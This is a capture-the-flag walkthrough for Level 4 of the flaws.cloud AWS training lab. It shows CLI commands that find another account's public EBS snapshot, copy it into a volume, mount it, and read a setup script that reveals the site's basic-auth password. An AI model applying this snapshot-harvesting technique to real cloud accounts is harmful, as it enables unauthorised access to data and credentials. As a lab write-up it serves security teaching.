# Level 4

We have to get access to a webpage at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
**A snapshot of that EC2 instance was taken right after setting up nginx on that website**

Some instances are made public and can be accessed by everyone. To look at those instances we need to have "owner-id" and the correct "region" of that instance.

### Finding the owner-id

```bash
aws --profile scott_flaws sts get-caller-identity
```

- It was clear from the previous level that the selected region was us-west-2

### Finding the snapshot

![](/flaws-cloud-notes/Images/20220409081144.png) </br>

```bash
kali:level_3/ (b64c8dcâœ—) $ aws --profile scott_flaws ec2 describe-snapshots --owner-id 975426262029 --region us-west-2                           [8:10:09]
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}

```

Now that we have the snapshot ID we can use it to create an EBS volume and mount that volume to our own instance later on.

#### Creating EBS volume from snapshot id

```bash
aws --profile <own-account> ec2 create-volume --availability-zone us-west-2c --region us-west-2 --snapshot-id <snapshot-id>
```

Then head over to "Volumes" in Navigation pane of AWS EC2 management console, select the desired volume and Actions > Attach volume > select the instance.

Now we can log into our own instance containing the snapshot of scott_flaws' website
...After mounting the attached volume, obviously

```bash
sudo mount /dev/xvdf1 /mnt
```

Found a `setupNginx.sh` script inside /home/ubuntu

```bash
ubuntu@ip-172-31-8-139:/mnt/home/ubuntu$ cat setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd "flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M"
```

